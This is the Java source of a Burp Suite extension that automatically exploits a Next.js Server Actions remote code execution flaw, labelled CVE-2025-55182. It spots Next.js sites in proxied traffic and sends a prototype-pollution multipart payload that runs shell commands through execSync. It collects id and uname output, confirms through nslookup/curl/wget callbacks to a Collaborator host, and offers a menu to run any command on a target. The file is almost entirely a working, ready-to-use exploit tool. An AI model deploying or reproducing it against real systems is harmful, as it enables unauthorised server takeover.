package burp;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;

/**
 * CVE-2025-55182 Next.js RCE Passive Scanner v2.0
 * 
 * Features:
 * - Passive Scanning: Auto-detect Next.js sites
 * - DNSLog Detection: Use Burp Collaborator for OOB verification
 * - Auto Exploit: Execute id/uname on vulnerable targets
 * - Results Table: Display all findings
 * 
 * Author: Cr4at0r
 * GitHub: https://github.com/Cr4at0r
 */
public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContextMenuFactory {
    
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private PrintWriter stdout;
    private PrintWriter stderr;
    
    // Burp Collaborator
    private IBurpCollaboratorClientContext collaborator;
    
    // UI Components
    private JPanel mainPanel;
    private JTable resultsTable;
    private DefaultTableModel tableModel;
    private JTextArea logArea;
    private JLabel statusLabel;
    private JCheckBox useDnsLog;
    
    // Track scanned hosts
    private ConcurrentHashMap<String, Boolean> scannedHosts = new ConcurrentHashMap<>();
    private ConcurrentHashMap<String, VulnInfo> vulnerableHosts = new ConcurrentHashMap<>();
    
    // DNSLog pending checks: collaborator payload -> target info
    private ConcurrentHashMap<String, PendingCheck> pendingChecks = new ConcurrentHashMap<>();
    
    // Settings
    private volatile boolean scanEnabled = true;
    private volatile boolean dnsLogEnabled = true;
    
    // Polling thread
    private Thread pollingThread;
    private volatile boolean pollingActive = false;
    
    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        this.stderr = new PrintWriter(callbacks.getStderr(), true);
        
        callbacks.setExtensionName("Next.js RCE Scanner v2.0");
        
        // Initialize Burp Collaborator
        try {
            collaborator = callbacks.createBurpCollaboratorClientContext();
            stdout.println("[+] Burp Collaborator initialized");
        } catch (Exception e) {
            stdout.println("[!] Burp Collaborator not available, using echo mode only");
        }
        
        // Register HTTP listener
        callbacks.registerHttpListener(this);
        
        // Register context menu
        callbacks.registerContextMenuFactory(this);
        
        // Create UI
        SwingUtilities.invokeLater(() -> {
            createUI();
            callbacks.addSuiteTab(this);
        });
        
        // Start collaborator polling thread
        startPollingThread();
        
        printBanner();
    }
    
    private void printBanner() {
        stdout.println("╔════════════════════════════════════════════════════════════╗");
        stdout.println("║     CVE-2025-55182 Next.js RCE Scanner v2.0                ║");
        stdout.println("║                                                            ║");
        stdout.println("║  Author: Cr4at0r                                           ║");
        stdout.println("║  GitHub: https://github.com/Cr4at0r                        ║");
        stdout.println("║                                                            ║");
        stdout.println("║  [NEW] DNSLog Detection via Burp Collaborator              ║");
        stdout.println("║  [!] 被动扫描已启动                                         ║");
        stdout.println("║  [*] 支持两种检测模式: Echo / DNSLog                        ║");
        stdout.println("╚════════════════════════════════════════════════════════════╝");
    }
    
    private void createUI() {
        mainPanel = new JPanel(new BorderLayout(5, 5));
        mainPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));
        
        // Top panel - Status and controls
        JPanel topPanel = new JPanel();
        topPanel.setLayout(new BoxLayout(topPanel, BoxLayout.Y_AXIS));
        
        // Status row
        JPanel statusRow = new JPanel(new FlowLayout(FlowLayout.LEFT));
        statusRow.setBorder(BorderFactory.createTitledBorder("扫描状态"));
        
        statusLabel = new JLabel("● 被动扫描已启用");
        statusLabel.setForeground(new Color(0, 150, 0));
        statusLabel.setFont(new Font("Dialog", Font.BOLD, 14));
        statusRow.add(statusLabel);
        
        JCheckBox enableScan = new JCheckBox("启用扫描", true);
        enableScan.addActionListener(e -> {
            scanEnabled = enableScan.isSelected();
            updateStatusLabel();
        });
        statusRow.add(enableScan);
        
        useDnsLog = new JCheckBox("DNSLog模式", true);
        useDnsLog.addActionListener(e -> {
            dnsLogEnabled = useDnsLog.isSelected();
            updateStatusLabel();
        });
        statusRow.add(useDnsLog);
        
        if (collaborator == null) {
            useDnsLog.setEnabled(false);
            useDnsLog.setSelected(false);
            dnsLogEnabled = false;
            statusRow.add(new JLabel("(Collaborator 不可用)"));
        }
        
        topPanel.add(statusRow);
        
        // Control row
        JPanel controlRow = new JPanel(new FlowLayout(FlowLayout.LEFT));
        controlRow.setBorder(BorderFactory.createTitledBorder("操作"));
        
        JButton clearButton = new JButton("清空结果");
        clearButton.addActionListener(e -> {
            tableModel.setRowCount(0);
            scannedHosts.clear();
            vulnerableHosts.clear();
            pendingChecks.clear();
            log("[*] 已清空扫描结果");
        });
        controlRow.add(clearButton);
        
        JButton exportButton = new JButton("导出结果");
        exportButton.addActionListener(e -> exportResults());
        controlRow.add(exportButton);
        
        JLabel pendingLabel = new JLabel("等待 DNS 回调: 0");
        controlRow.add(pendingLabel);
        
        // Update pending count periodically
        javax.swing.Timer updateTimer = new javax.swing.Timer(2000, e -> {
            pendingLabel.setText("等待 DNS 回调: " + pendingChecks.size());
        });
        updateTimer.start();
        
        topPanel.add(controlRow);
        
        mainPanel.add(topPanel, BorderLayout.NORTH);
        
        // Center panel - Results table
        JPanel tablePanel = new JPanel(new BorderLayout());
        tablePanel.setBorder(BorderFactory.createTitledBorder("发现的漏洞站点"));
        
        String[] columns = {"#", "目标URL", "检测方式", "状态", "用户信息", "系统信息", "发现时间"};
        tableModel = new DefaultTableModel(columns, 0) {
            @Override
            public boolean isCellEditable(int row, int column) {
                return false;
            }
        };
        
        resultsTable = new JTable(tableModel);
        resultsTable.setFont(new Font("Monospaced", Font.PLAIN, 12));
        resultsTable.setRowHeight(25);
        resultsTable.getColumnModel().getColumn(0).setPreferredWidth(30);
        resultsTable.getColumnModel().getColumn(1).setPreferredWidth(280);
        resultsTable.getColumnModel().getColumn(2).setPreferredWidth(80);
        resultsTable.getColumnModel().getColumn(3).setPreferredWidth(70);
        resultsTable.getColumnModel().getColumn(4).setPreferredWidth(180);
        resultsTable.getColumnModel().getColumn(5).setPreferredWidth(220);
        resultsTable.getColumnModel().getColumn(6).setPreferredWidth(140);
        
        // Popup menu
        JPopupMenu popup = new JPopupMenu();
        JMenuItem copyUrl = new JMenuItem("复制URL");
        copyUrl.addActionListener(e -> {
            int row = resultsTable.getSelectedRow();
            if (row >= 0) {
                String url = (String) tableModel.getValueAt(row, 1);
                java.awt.Toolkit.getDefaultToolkit().getSystemClipboard()
                    .setContents(new java.awt.datatransfer.StringSelection(url), null);
            }
        });
        popup.add(copyUrl);
        
        JMenuItem executeCmd = new JMenuItem("执行命令...");
        executeCmd.addActionListener(e -> {
            int row = resultsTable.getSelectedRow();
            if (row >= 0) {
                String url = (String) tableModel.getValueAt(row, 1);
                String cmd = JOptionPane.showInputDialog(mainPanel, "输入要执行的命令:", "id");
                if (cmd != null && !cmd.isEmpty()) {
                    executeCommandOnTarget(url, cmd);
                }
            }
        });
        popup.add(executeCmd);
        
        resultsTable.setComponentPopupMenu(popup);
        
        JScrollPane tableScroll = new JScrollPane(resultsTable);
        tablePanel.add(tableScroll, BorderLayout.CENTER);
        
        // Bottom panel - Log
        JPanel logPanel = new JPanel(new BorderLayout());
        logPanel.setBorder(BorderFactory.createTitledBorder("扫描日志"));
        
        logArea = new JTextArea();
        logArea.setEditable(false);
        logArea.setFont(new Font("Monospaced", Font.PLAIN, 11));
        logArea.setBackground(new Color(30, 30, 30));
        logArea.setForeground(new Color(0, 255, 0));
        
        JScrollPane logScroll = new JScrollPane(logArea);
        logPanel.add(logScroll, BorderLayout.CENTER);
        
        // Split Pane
        JSplitPane splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT, tablePanel, logPanel);
        splitPane.setResizeWeight(0.7); // 70% for table, 30% for log
        
        mainPanel.add(splitPane, BorderLayout.CENTER);
        
        log("[*] 扩展加载完成 v2.1");
        log("[*] 被动扫描已启动 - " + (dnsLogEnabled ? "DNSLog + Echo 双模式" : "Echo 模式"));
    }
    
    private void updateStatusLabel() {
        if (scanEnabled) {
            statusLabel.setText("● 被动扫描已启用 (" + (dnsLogEnabled ? "DNSLog" : "Echo") + ")");
            statusLabel.setForeground(new Color(0, 150, 0));
        } else {
            statusLabel.setText("○ 被动扫描已禁用");
            statusLabel.setForeground(Color.GRAY);
        }
    }
    
    @Override
    public String getTabCaption() {
        return "Next.js RCE";
    }
    
    @Override
    public Component getUiComponent() {
        return mainPanel;
    }
    
    // ==================== Collaborator Polling ====================
    
    private void startPollingThread() {
        pollingActive = true;
        pollingThread = new Thread(() -> {
            while (pollingActive) {
                try {
                    Thread.sleep(3000); // Poll every 3 seconds
                    
                    if (collaborator != null && !pendingChecks.isEmpty()) {
                        List<IBurpCollaboratorInteraction> interactions = collaborator.fetchAllCollaboratorInteractions();
                        
                        for (IBurpCollaboratorInteraction interaction : interactions) {
                            String interactionId = interaction.getProperty("interaction_id");
                            String type = interaction.getProperty("type");
                            
                            // Find matching pending check
                            for (Map.Entry<String, PendingCheck> entry : pendingChecks.entrySet()) {
                                if (entry.getKey().contains(interactionId) || 
                                    interaction.getProperty("raw_query") != null && 
                                    interaction.getProperty("raw_query").contains(entry.getValue().marker)) {
                                    
                                    PendingCheck check = entry.getValue();
                                    pendingChecks.remove(entry.getKey());
                                    
                                    log("[+] DNSLog 回调收到! " + check.baseUrl + " (" + type + ")");
                                    
                                    // Mark as vulnerable and get more info
                                    VulnInfo info = new VulnInfo();
                                    info.url = check.baseUrl;
                                    info.vulnPath = check.path;
                                    info.detectionMethod = "DNSLog";
                                    info.isVulnerable = true;
                                    info.timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
                                    
                                    // Try to get user/system info using echo method
                                    try {
                                        String userResult = executeExploit(check.service, check.path, "id");
                                        if (userResult != null) info.userInfo = userResult.trim();
                                        
                                        String sysResult = executeExploit(check.service, check.path, "uname -a");
                                        if (sysResult != null) {
                                            info.systemInfo = sysResult.trim();
                                            if (info.systemInfo.length() > 80) {
                                                info.systemInfo = info.systemInfo.substring(0, 80) + "...";
                                            }
                                        }
                                    } catch (Exception e) {
                                        // Ignore
                                    }
                                    
                                    vulnerableHosts.put(check.baseUrl, info);
                                    addToTable(info);
                                    
                                    break;
                                }
                            }
                        }
                    }
                    
                    // Clean up old pending checks (> 60 seconds)
                    long now = System.currentTimeMillis();
                    pendingChecks.entrySet().removeIf(e -> now - e.getValue().timestamp > 60000);
                    
                } catch (InterruptedException e) {
                    break;
                } catch (Exception e) {
                    // Ignore polling errors
                }
            }
        });
        pollingThread.setDaemon(true);
        pollingThread.start();
    }
    
    // ==================== HTTP Listener ====================
    
    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
        if (messageIsRequest || !scanEnabled) {
            return;
        }
        
        new Thread(() -> processResponse(messageInfo)).start();
    }
    
    private void processResponse(IHttpRequestResponse messageInfo) {
        try {
            IHttpService service = messageInfo.getHttpService();
            String host = service.getHost();
            String baseUrl = service.getProtocol() + "://" + host;
            if ((service.getProtocol().equals("https") && service.getPort() != 443) ||
                (service.getProtocol().equals("http") && service.getPort() != 80)) {
                baseUrl += ":" + service.getPort();
            }
            
            if (scannedHosts.containsKey(baseUrl)) {
                return;
            }
            
            byte[] response = messageInfo.getResponse();
            if (response == null) return;
            
            String responseStr = helpers.bytesToString(response);
            IResponseInfo responseInfo = helpers.analyzeResponse(response);
            
            if (!isNextJsSite(responseStr, responseInfo)) {
                return;
            }
            
            scannedHosts.put(baseUrl, true);
            log("[*] 检测到 Next.js 站点: " + baseUrl);
            
            // Test for vulnerability
            VulnInfo vulnInfo = checkVulnerability(service, baseUrl);
            
            if (vulnInfo != null && vulnInfo.isVulnerable) {
                vulnerableHosts.put(baseUrl, vulnInfo);
                log("[+] 发现漏洞! " + baseUrl + " (" + vulnInfo.detectionMethod + ")");
                if (vulnInfo.userInfo != null) log("[+] 用户: " + vulnInfo.userInfo);
                if (vulnInfo.systemInfo != null) log("[+] 系统: " + vulnInfo.systemInfo);
                
                addToTable(vulnInfo);
                reportIssue(messageInfo, vulnInfo);
            } else if (vulnInfo != null && vulnInfo.pendingDnsCheck) {
                log("[*] 等待 DNSLog 回调: " + baseUrl);
            } else {
                log("[-] 未发现漏洞: " + baseUrl);
            }
            
        } catch (Exception e) {
            // Silently ignore
        }
    }
    
    private boolean isNextJsSite(String response, IResponseInfo responseInfo) {
        String[] indicators = {
            "_next/static", "__NEXT_DATA__", "/_next/",
            "next/dist", "x-nextjs", "__next", "Next.js"
        };
        
        for (String indicator : indicators) {
            if (response.contains(indicator)) {
                return true;
            }
        }
        
        for (String header : responseInfo.getHeaders()) {
            String lowerHeader = header.toLowerCase();
            if (lowerHeader.contains("x-nextjs") || 
                lowerHeader.contains("x-powered-by: next")) {
                return true;
            }
        }
        
        return false;
    }
    
    /**
     * Check vulnerability: Echo first, then DNSLog if Echo fails
     */
    private VulnInfo checkVulnerability(IHttpService service, String baseUrl) {
        VulnInfo info = new VulnInfo();
        info.url = baseUrl;
        info.timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
        
        String[] paths = {"/apps", "/", "/en", "/api/action", "/login"};
        
        // 1. Try Echo detection first (Fast & Direct)
        String testString = generateRandomString(8);
        String testCommand = "echo " + testString;
        
        for (String path : paths) {
            String result = executeExploit(service, path, testCommand);
            
            if (result != null && result.contains(testString)) {
                info.isVulnerable = true;
                info.vulnPath = path;
                info.detectionMethod = "Echo";
                
                String userResult = executeExploit(service, path, "id");
                if (userResult != null && !userResult.isEmpty()) {
                    info.userInfo = userResult.trim();
                }
                
                String sysResult = executeExploit(service, path, "uname -a");
                if (sysResult != null && !sysResult.isEmpty()) {
                    info.systemInfo = sysResult.trim();
                    if (info.systemInfo.length() > 80) {
                        info.systemInfo = info.systemInfo.substring(0, 80) + "...";
                    }
                }
                
                // Found via Echo, but continue to DNSLog as requested
                break; 
            }
        }
        
        // 2. Always try DNSLog (if enabled) - Run both checks
        if (dnsLogEnabled && collaborator != null) {
            for (String path : paths) {
                if (sendDnsLogPayload(service, baseUrl, path)) {
                    info.pendingDnsCheck = true;
                    if (info.isVulnerable) {
                        log("[*] Echo 成功，继续尝试 DNSLog: " + path);
                    } else {
                        log("[*] Echo 失败，尝试 DNSLog: " + path);
                    }
                    // Send one DNSLog payload and return to wait for callback
                    break; 
                }
            }
        }
        
        return info;
    }
    
    /**
     * Send DNSLog detection payload
     */
    private boolean sendDnsLogPayload(IHttpService service, String baseUrl, String path) {
        try {
            String payload = collaborator.generatePayload(true);
            String marker = generateRandomString(6);
            
            // DNS lookup command: nslookup/curl/wget
            String command = String.format("nslookup %s.%s || curl %s.%s || wget %s.%s", 
                marker, payload, marker, payload, marker, payload);
            
            // Build payload
            String escapedCommand = command.replace("'", "\\'");
            String prefix = String.format(
                "var x=process.mainModule.require('child_process').execSync('%s');",
                escapedCommand
            );
            
            String payloadJson = String.format(
                "{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\"then\\\":\\\"$B1337\\\"}\",\"_response\":{\"_prefix\":\"%s\",\"_chunks\":\"$Q2\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}}",
                prefix.replace("\\", "\\\\").replace("\"", "\\\"")
            );
            
            String boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
            
            StringBuilder body = new StringBuilder();
            body.append("------").append(boundary).append("\r\n");
            body.append("Content-Disposition: form-data; name=\"0\"\r\n\r\n");
            body.append(payloadJson).append("\r\n");
            body.append("------").append(boundary).append("\r\n");
            body.append("Content-Disposition: form-data; name=\"1\"\r\n\r\n");
            body.append("\"$@0\"").append("\r\n");
            body.append("------").append(boundary).append("\r\n");
            body.append("Content-Disposition: form-data; name=\"2\"\r\n\r\n");
            body.append("[]").append("\r\n");
            body.append("------").append(boundary).append("--");
            
            List<String> headers = new ArrayList<>();
            headers.add("POST " + path + " HTTP/1.1");
            headers.add("Host: " + service.getHost());
            headers.add("Content-Type: multipart/form-data; boundary=----" + boundary);
            headers.add("User-Agent: Mozilla/5.0");
            headers.add("Next-Action: x");
            headers.add("Connection: close");
            
            byte[] request = helpers.buildHttpMessage(headers, body.toString().getBytes("UTF-8"));
            callbacks.makeHttpRequest(service, request);
            
            // Register pending check
            PendingCheck check = new PendingCheck();
            check.baseUrl = baseUrl;
            check.service = service;
            check.path = path;
            check.marker = marker;
            check.timestamp = System.currentTimeMillis();
            pendingChecks.put(payload, check);
            
            return true;
            
        } catch (Exception e) {
            return false;
        }
    }
    
    /**
     * Execute exploit and get result
     */
    private String executeExploit(IHttpService service, String path, String command) {
        try {
            String escapedCommand = command.replace("'", "\\'");
            
            String prefix = String.format(
                "var res=process.mainModule.require('child_process').execSync('%s | base64 -w 0').toString().trim();" +
                ";throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",
                escapedCommand
            );
            
            String payloadJson = String.format(
                "{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\"then\\\":\\\"$B1337\\\"}\",\"_response\":{\"_prefix\":\"%s\",\"_chunks\":\"$Q2\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}}",
                prefix.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n")
            );
            
            String boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
            
            StringBuilder body = new StringBuilder();
            body.append("------").append(boundary).append("\r\n");
            body.append("Content-Disposition: form-data; name=\"0\"\r\n\r\n");
            body.append(payloadJson).append("\r\n");
            body.append("------").append(boundary).append("\r\n");
            body.append("Content-Disposition: form-data; name=\"1\"\r\n\r\n");
            body.append("\"$@0\"").append("\r\n");
            body.append("------").append(boundary).append("\r\n");
            body.append("Content-Disposition: form-data; name=\"2\"\r\n\r\n");
            body.append("[]").append("\r\n");
            body.append("------").append(boundary).append("--");
            
            List<String> headers = new ArrayList<>();
            headers.add("POST " + path + " HTTP/1.1");
            headers.add("Host: " + service.getHost());
            headers.add("Content-Type: multipart/form-data; boundary=----" + boundary);
            headers.add("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            headers.add("Next-Action: x");
            headers.add("Connection: close");
            
            byte[] request = helpers.buildHttpMessage(headers, body.toString().getBytes("UTF-8"));
            IHttpRequestResponse response = callbacks.makeHttpRequest(service, request);
            
            if (response.getResponse() != null) {
                IResponseInfo respInfo = helpers.analyzeResponse(response.getResponse());
                int statusCode = respInfo.getStatusCode();
                
                if (statusCode == 302 || statusCode == 303 || statusCode == 307) {
                    String redirectUrl = getHeader(respInfo, "x-action-redirect");
                    if (redirectUrl == null || redirectUrl.isEmpty()) {
                        redirectUrl = getHeader(respInfo, "Location");
                    }
                    
                    if (redirectUrl != null && redirectUrl.contains("?a=")) {
                        return extractResult(redirectUrl);
                    }
                }
                
                String responseStr = helpers.bytesToString(response.getResponse());
                java.util.regex.Pattern pattern = java.util.regex.Pattern.compile("/login\\?a=([A-Za-z0-9+/=]+)");
                java.util.regex.Matcher matcher = pattern.matcher(responseStr);
                if (matcher.find()) {
                    String encoded = matcher.group(1);
                    return new String(helpers.base64Decode(encoded), "UTF-8");
                }
            }
            
        } catch (Exception e) {
            // Ignore
        }
        
        return null;
    }
    
    private String extractResult(String redirectUrl) {
        try {
            if (redirectUrl.contains("?a=")) {
                String encoded = redirectUrl.split("\\?a=")[1];
                if (encoded.contains("&")) encoded = encoded.split("&")[0];
                if (encoded.contains(";")) encoded = encoded.split(";")[0];
                encoded = helpers.urlDecode(encoded);
                return new String(helpers.base64Decode(encoded), "UTF-8");
            }
        } catch (Exception e) {
            // Ignore
        }
        return null;
    }
    
    private String getHeader(IResponseInfo responseInfo, String headerName) {
        for (String header : responseInfo.getHeaders()) {
            if (header.toLowerCase().startsWith(headerName.toLowerCase() + ":")) {
                return header.substring(headerName.length() + 1).trim();
            }
        }
        return null;
    }
    
    private String generateRandomString(int length) {
        String chars = "abcdefghijklmnopqrstuvwxyz";
        StringBuilder sb = new StringBuilder();
        Random random = new Random();
        for (int i = 0; i < length; i++) {
            sb.append(chars.charAt(random.nextInt(chars.length())));
        }
        return sb.toString();
    }
    
    // ==================== Table Operations ====================
    
    private void addToTable(VulnInfo info) {
        SwingUtilities.invokeLater(() -> {
            int rowNum = tableModel.getRowCount() + 1;
            Object[] row = {
                rowNum,
                info.url,
                info.detectionMethod != null ? info.detectionMethod : "N/A",
                "存在漏洞",
                info.userInfo != null ? info.userInfo : "N/A",
                info.systemInfo != null ? info.systemInfo : "N/A",
                info.timestamp
            };
            tableModel.addRow(row);
        });
    }
    
    private void executeCommandOnTarget(String url, String command) {
        new Thread(() -> {
            try {
                log("[*] 执行命令: " + command + " @ " + url);
                
                java.net.URL parsedUrl = new java.net.URL(url);
                String host = parsedUrl.getHost();
                int port = parsedUrl.getPort() == -1 ? 
                    (parsedUrl.getProtocol().equals("https") ? 443 : 80) : parsedUrl.getPort();
                boolean useHttps = parsedUrl.getProtocol().equals("https");
                
                IHttpService service = helpers.buildHttpService(host, port, useHttps);
                
                VulnInfo info = vulnerableHosts.get(url);
                String path = info != null && info.vulnPath != null ? info.vulnPath : "/apps";
                
                String result = executeExploit(service, path, command);
                
                if (result != null) {
                    log("[+] 命令输出:\n" + result);
                } else {
                    log("[-] 命令执行失败");
                }
                
            } catch (Exception e) {
                log("[!] 错误: " + e.getMessage());
            }
        }).start();
    }
    
    private void exportResults() {
        StringBuilder sb = new StringBuilder();
        sb.append("# CVE-2025-55182 Scan Results\n");
        sb.append("# Generated: ").append(new Date()).append("\n\n");
        
        for (int i = 0; i < tableModel.getRowCount(); i++) {
            sb.append("URL: ").append(tableModel.getValueAt(i, 1)).append("\n");
            sb.append("Detection: ").append(tableModel.getValueAt(i, 2)).append("\n");
            sb.append("User: ").append(tableModel.getValueAt(i, 4)).append("\n");
            sb.append("System: ").append(tableModel.getValueAt(i, 5)).append("\n");
            sb.append("Time: ").append(tableModel.getValueAt(i, 6)).append("\n");
            sb.append("---\n");
        }
        
        java.awt.Toolkit.getDefaultToolkit().getSystemClipboard()
            .setContents(new java.awt.datatransfer.StringSelection(sb.toString()), null);
        
        log("[*] 结果已复制到剪贴板 (" + tableModel.getRowCount() + " 条记录)");
    }
    
    private void reportIssue(IHttpRequestResponse messageInfo, VulnInfo info) {
        try {
            IScanIssue issue = new NextJSRCEIssue(
                messageInfo.getHttpService(),
                helpers.analyzeRequest(messageInfo).getUrl(),
                new IHttpRequestResponse[]{messageInfo},
                info
            );
            callbacks.addScanIssue(issue);
        } catch (Exception e) {
            // Ignore
        }
    }
    
    // ==================== Context Menu ====================
    
    @Override
    public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation) {
        List<JMenuItem> menuItems = new ArrayList<>();
        
        IHttpRequestResponse[] messages = invocation.getSelectedMessages();
        if (messages != null && messages.length > 0) {
            JMenuItem scanItem = new JMenuItem("测试 Next.js RCE 漏洞");
            scanItem.addActionListener(e -> {
                for (IHttpRequestResponse message : messages) {
                    new Thread(() -> processResponse(message)).start();
                }
            });
            menuItems.add(scanItem);
        }
        
        return menuItems;
    }
    
    // ==================== Logging ====================
    
    private void log(String message) {
        SwingUtilities.invokeLater(() -> {
            String timestamp = new SimpleDateFormat("HH:mm:ss").format(new Date());
            logArea.append("[" + timestamp + "] " + message + "\n");
            logArea.setCaretPosition(logArea.getDocument().getLength());
        });
        stdout.println(message);
    }
    
    // ==================== Data Classes ====================
    
    class VulnInfo {
        String url;
        boolean isVulnerable = false;
        boolean pendingDnsCheck = false;
        String vulnPath;
        String userInfo;
        String systemInfo;
        String timestamp;
        String detectionMethod;
    }
    
    class PendingCheck {
        String baseUrl;
        IHttpService service;
        String path;
        String marker;
        long timestamp;
    }
    
    // ==================== Scan Issue ====================
    
    class NextJSRCEIssue implements IScanIssue {
        private IHttpService httpService;
        private java.net.URL url;
        private IHttpRequestResponse[] httpMessages;
        private VulnInfo vulnInfo;
        
        public NextJSRCEIssue(IHttpService httpService, java.net.URL url, 
                             IHttpRequestResponse[] httpMessages, VulnInfo vulnInfo) {
            this.httpService = httpService;
            this.url = url;
            this.httpMessages = httpMessages;
            this.vulnInfo = vulnInfo;
        }
        
        @Override
        public java.net.URL getUrl() { return url; }
        
        @Override
        public String getIssueName() { return "Next.js Remote Code Execution (CVE-2025-55182)"; }
        
        @Override
        public int getIssueType() { return 0x08000000; }
        
        @Override
        public String getSeverity() { return "High"; }
        
        @Override
        public String getConfidence() { return "Certain"; }
        
        @Override
        public String getIssueBackground() {
            return "A Remote Code Execution vulnerability exists in Next.js Server Actions.";
        }
        
        @Override
        public String getRemediationBackground() {
            return "Update Next.js to a patched version.";
        }
        
        @Override
        public String getIssueDetail() {
            StringBuilder sb = new StringBuilder();
            sb.append("<p><b>CVE-2025-55182 - Next.js Remote Code Execution</b></p>");
            sb.append("<p><b>Detection Method:</b> ").append(vulnInfo.detectionMethod).append("</p>");
            sb.append("<ul>");
            sb.append("<li><b>User:</b> ").append(escapeHtml(vulnInfo.userInfo)).append("</li>");
            sb.append("<li><b>System:</b> ").append(escapeHtml(vulnInfo.systemInfo)).append("</li>");
            sb.append("<li><b>Path:</b> ").append(vulnInfo.vulnPath).append("</li>");
            sb.append("</ul>");
            return sb.toString();
        }
        
        @Override
        public String getRemediationDetail() {
            return "Update Next.js to the latest patched version.";
        }
        
        @Override
        public IHttpRequestResponse[] getHttpMessages() { return httpMessages; }
        
        @Override
        public IHttpService getHttpService() { return httpService; }
        
        private String escapeHtml(String str) {
            if (str == null) return "N/A";
            return str.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
        }
    }
}
